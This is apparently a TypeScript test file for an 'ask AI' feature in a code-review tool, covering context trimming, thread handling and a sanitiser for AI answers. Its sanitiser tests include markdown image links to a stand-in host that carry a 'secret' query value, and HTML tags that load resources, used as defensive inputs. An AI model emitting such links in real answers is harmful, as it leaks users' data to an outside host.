import { describe, expect, it } from 'vitest'
import type { AskThreadContext, CommentThread, PrComment } from '../../../shared/types'
import { MAX_ASK_CONTEXT_LEN, MAX_ASK_HISTORY_TURNS } from '../../../shared/types'
import { answerDraft, askContext, threadContext, threadQuestionLines } from './ask-ai'

function size(context: ReturnType<typeof askContext>): number {
  const history = (context.history ?? []).reduce(
    (n, t) => n + t.question.length + t.answer.length,
    0,
  )
  const thread = (context.thread?.comments ?? []).reduce(
    (n, c) => n + c.author.length + c.body.length,
    0,
  )
  return history + thread
}

const turn = (i: number, answer = 'answer ' + i): { question: string; answer: string } => ({
  question: 'question ' + i,
  answer,
})

const thread = (...bodies: string[]): AskThreadContext => ({
  outdated: false,
  comments: bodies.map((body, i) => ({ author: 'user' + i, body })),
})

describe('askContext', () => {
  it('sends everything when it fits, and nothing when there is nothing', () => {
    expect(askContext([])).toEqual({})
    const history = [turn(1), turn(2)]
    const t = thread('Is this safe?', 'I think so.')
    expect(askContext(history, t)).toEqual({ history, thread: t })
  })

  it('keeps the newest turns: the oldest go first, and never more than the channel takes', () => {
    const history = Array.from({ length: 14 }, (_, i) => turn(i))
    const fitted = askContext(history).history ?? []
    expect(fitted).toHaveLength(MAX_ASK_HISTORY_TURNS)
    expect(fitted.at(-1)).toEqual(turn(13))

    // Each turn costs 410: two fit whole, the third only shortened (or not at all).
    const big = 'x'.repeat(400)
    const three = [turn(1, big), turn(2, big), turn(3, big)]
    const dropped = askContext(three, undefined, 850).history ?? []
    expect(dropped).toEqual([turn(2, big), turn(3, big)])
    const shortened = askContext(three, undefined, 900).history ?? []
    expect(shortened.map((t) => t.question)).toEqual(['question 1', 'question 2', 'question 3'])
    expect(shortened[0].answer.endsWith('…')).toBe(true)
    expect(size({ history: shortened })).toBeLessThanOrEqual(900)
  })

  it('gives the thread at most half the budget when there is history, keeping its first comment', () => {
    const long = 'y'.repeat(30_000)
    const context = askContext([turn(1, 'z'.repeat(30_000))], thread(long, 'short reply', long))
    expect(size(context)).toBeLessThanOrEqual(MAX_ASK_CONTEXT_LEN)
    const comments = context.thread?.comments ?? []
    expect(comments[0].author).toBe('user0')
    expect(comments[0].body.endsWith('…')).toBe(true)
    expect(comments.at(-1)?.author).toBe('user2')
    expect(context.history?.[0].answer.endsWith('…')).toBe(true)
  })

  it('a thread alone can use the whole budget', () => {
    const context = askContext([], thread('a'.repeat(15_000), 'b'.repeat(15_000)))
    expect(size(context)).toBeLessThanOrEqual(MAX_ASK_CONTEXT_LEN)
    expect(size(context)).toBeGreaterThan(MAX_ASK_CONTEXT_LEN / 2)
  })
})

describe('threadContext', () => {
  const comment = (over: Partial<PrComment>): PrComment => ({
    id: 'c',
    author: { login: 'alice' },
    bodyMarkdown: 'body',
    createdAt: '2026-01-01T00:00:00.000Z',
    isMinimized: false,
    ...over,
  })
  const base: CommentThread = {
    id: 't',
    status: 'active',
    isResolved: false,
    isLineThread: true,
    comments: [],
  }

  it('names authors by display name, skips hidden comments and flags outdated threads', () => {
    const context = threadContext({
      ...base,
      isOutdated: true,
      comments: [
        comment({ author: { login: 'alice', displayName: 'Alice A.' }, bodyMarkdown: 'Concern' }),
        comment({ bodyMarkdown: 'spam', isMinimized: true }),
        comment({ author: { login: 'bob' }, bodyMarkdown: 'Reply' }),
      ],
    })
    expect(context).toEqual({
      outdated: true,
      comments: [
        { author: 'Alice A.', body: 'Concern' },
        { author: 'bob', body: 'Reply' },
      ],
    })
  })

  it('keeps hidden comments when they are all there is', () => {
    const context = threadContext({ ...base, comments: [comment({ isMinimized: true })] })
    expect(context.comments).toHaveLength(1)
  })
})

describe('threadQuestionLines', () => {
  it('asks about the thread range, cut to the widest range main takes', () => {
    expect(threadQuestionLines({ line: 7 })).toEqual({ startLine: 7, endLine: 7 })
    expect(threadQuestionLines({ line: 7, lineEnd: 9 })).toEqual({ startLine: 7, endLine: 9 })
    expect(threadQuestionLines({ line: 1, lineEnd: 1000 })).toEqual({ startLine: 1, endLine: 400 })
  })

  it('a file-level thread covers no lines', () => {
    expect(threadQuestionLines({})).toEqual({})
  })
})

describe('answerDraft', () => {
  it('turns images into plain links, inline and reference style', () => {
    expect(answerDraft('See ![ok](https://evil.example/?d=secret) here')).toBe(
      'See [ok](https://evil.example/?d=secret) here',
    )
    expect(answerDraft('[![badge][b]](x)\n\n[b]: https://evil.example/p.png')).toBe(
      '[[badge][b]](x)\n\n[b]: https://evil.example/p.png',
    )
    // A backslash before the backtick is no code span: the image is caught anyway.
    expect(answerDraft('\\`![x](https://evil.example/)\\`')).toBe(
      '\\`[x](https://evil.example/)\\`',
    )
  })

  it('escapes HTML comments and tags that load things, whatever the case or spacing', () => {
    expect(answerDraft('a <!-- hidden --> b')).toBe('a &lt;!-- hidden --> b')
    expect(answerDraft('<IMG src=x> < video src=y> </picture><source srcset=z>')).toBe(
      '&lt;IMG src=x> &lt; video src=y> &lt;/picture>&lt;source srcset=z>',
    )
  })

  it('leaves ordinary code and text alone', () => {
    const text =
      'Use `Promise<ApplyCouponResult>` and `a < b`, see [the docs](https://x.dev).\n\n' +
      '```ts\nconst ok = !cart && list.length > 0 && <div />\n```'
    expect(answerDraft(text)).toBe(text)
  })
})
